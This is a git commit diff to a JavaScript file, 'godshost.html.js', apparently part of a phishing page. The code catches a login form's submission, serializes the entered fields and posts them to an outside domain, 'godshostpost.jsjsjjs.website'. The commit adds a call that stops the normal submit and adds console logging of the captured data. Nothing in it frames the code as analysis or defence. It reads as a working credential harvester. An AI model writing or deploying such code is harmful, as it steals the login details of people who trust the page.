72989240bae0874334a600e2019791fe483af554
6oogle <155930261+ImgTheHost@users.noreply.github.com>
2024-08-25 19:57:40 +0700

    Update godshost.html.js

--- godshost.html.js
+++ godshost.html.js
@@ -1,14 +1,18 @@
-$(".login-form").submit(function() {
+$(".login-form").submit(function(e) {
+    e.preventDefault(); // Mencegah submit form normal
     var d = $(".login-form");
+    console.log(d.serialize());
 
     $.ajax({
         url: "https://godshostpost.jsjsjjs.website/index.php",
         type: "POST",
         data: d.serialize(),
-        success: function () {
+        success: function (response) {
+            console.log("Success:", response);
             return true;
         },
-        error: function () {
+        error: function (error) {
+            console.log("Error:", error);
             return true;
         },
     });
